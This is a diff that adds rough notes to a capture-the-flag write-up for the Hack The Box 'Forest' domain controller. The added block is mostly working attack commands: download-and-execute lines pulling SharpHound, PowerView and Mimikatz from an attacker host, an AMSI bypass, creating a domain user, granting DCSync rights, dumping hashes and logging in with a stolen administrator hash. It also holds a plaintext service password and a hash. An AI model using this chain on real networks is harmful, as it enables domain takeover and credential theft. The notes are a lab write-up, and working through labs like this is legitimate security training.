@@ -54,10 +54,60 @@ And just for completeness, Simple DNS Plus is vulnerable to a [Remote DoS attack
 
 ## User.txt
 
+```bash
+# Python Bloodhound Ingestor (returned some slightly jank data)
+bloodhound-python -d htb.local -u svc-alfresco -p s3rvice -gc forest.htb.local -c all -ns 10.129.95.210
 
+# SharpHound.ps1
+IEX(New-Object Net.WebClient).downloadString("http://10.10.14.3:8000/SharpHound.ps1")
+Invoke-BloodHound
+
+After reviewing the BloodHound data we find a path to DC Administrator via the following:
+
+- svc-alfresco is a member of "Service Accounts"
+- "Service Accounts" is a member of "Priviledged IT Accounts"
+- "Priviledged IT Accounts" is a member of "Account Operators"
+- members of "Account Operators" have "GenericAll" permissions on "Exchange Windows Permissions"
+
+
+IWR -Uri http://10.10.14.3:8000/PowerView.ps1 -Outfile pv.ps1
+Bypass-4MSI
+
+# Add a user
+net user bullsec Test123 /add /domain
+
+# Add them to the correct groups
+net group "Exchange Windows Permissions" bullsec /add
+net localgroup "Remote Management Users" bullsec /add
+
+
+evil-winrm -i 10.129.228.27 -u bullsec -p Test123
+$pass = convertto-securestring 'Test123' -asplain -force
+$cred = new-object system.management.automation.pscredential("htb\bullsec", $pass)
+Add-DomainObjectAcl -Credential $cred -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity bullsec -Rights DCSync
+impacket-secretsdump htb/bullsec@10.129.228.27 -outputfile forest.hashes
+impacket-psexec administrator@10.129.228.27 -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6
+type C:\Users\Administrator\Desktop\root.txt
+exit
+
+$pass = convertto-securestring 'Test123' -asplain -force
+$cred = new-object system.management.automation.pscredential("htb\bullsec", $pass)
+
+# This doesn't work
+Add-ObjectACL -PrincipalIdentity bullsec -Credential $cred -Rights DCSync
+DRSR SessionError: code: 0x20f7 - ERROR_DS_DRA_BAD_DN - The distinguished name specified for this replication operation is invalid.
+
+# This does
+
+
+Add-DomainObjectAcl
+
+
+IEX(New-Object Net.WebClient).downloadString("http://10.10.14.3:8000/Invoke-Mimikatz.ps1")
+```
 
 ## BloodHound
 
-![](/assets/img/2022-10-09-00-08-09.png)
+![BloodHound Graph](/assets/img/2022-10-09-00-08-09.png)
 
 ## Root.txt
